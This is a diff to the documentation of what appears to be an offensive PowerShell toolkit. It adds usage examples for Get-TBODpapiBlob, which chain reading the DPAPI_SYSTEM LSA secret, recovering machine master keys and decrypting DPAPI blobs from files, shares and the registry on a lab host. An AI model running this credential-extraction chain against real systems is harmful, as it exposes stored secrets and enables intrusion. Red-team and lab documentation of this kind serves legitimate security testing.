@@ -503,6 +503,24 @@ Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -Path tbo:\Us
 Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -RegistryPath HKLM\Software\Microsoft -Recurse
 ```
 
+#### Get-TBODpapiBlob
+
+Decrypts a DPAPI blob using a DPAPI master key.
+Use Get-TBODpapiMasterKeys to recover the master key first.
+
+```powershell
+$mk = Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBODpapiMasterKeys -Scope Machine |
+  Where-Object IsPreferred
+Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Users\Public\blob.bin' -MasterKey $mk.MasterKey
+
+$blob = Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -Path tbo:\Users -Recurse |
+  Select-Object -First 1
+Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -Path $blob.Path -Offset $blob.MatchOffset -MasterKey $mk.MasterKey
+
+Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -RegistryPath HKLM\Software\Contoso -ValueName Blob -MasterKey $mk.MasterKey
+```
+
 #### Get-TBORegAutoLogon
 
 Reads autologon configuration values from the Winlogon registry key.
